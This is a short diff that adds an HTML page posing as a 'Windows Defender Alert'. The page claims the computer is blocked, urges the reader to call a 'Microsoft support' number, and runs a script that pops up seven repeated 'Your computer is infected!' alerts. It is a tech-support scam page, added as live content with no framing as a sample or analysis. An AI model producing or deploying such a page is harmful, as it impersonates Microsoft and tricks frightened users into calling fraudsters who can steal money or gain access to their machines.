@@ -1,0 +1,7 @@
+<!doctype html><meta charset="utf-8"><title>Security Alert</title>
+<h1>Windows Defender Alert</h1>
+<p>Your computer has been blocked. Do not turn off your computer. Call Microsoft support now at 1-800-555-0199.</p>
+<script>
+  let n = 0;
+  const t = setInterval(() => { n++; alert('Your computer is infected!'); if (n > 6) clearInterval(t); }, 50);
+</script>
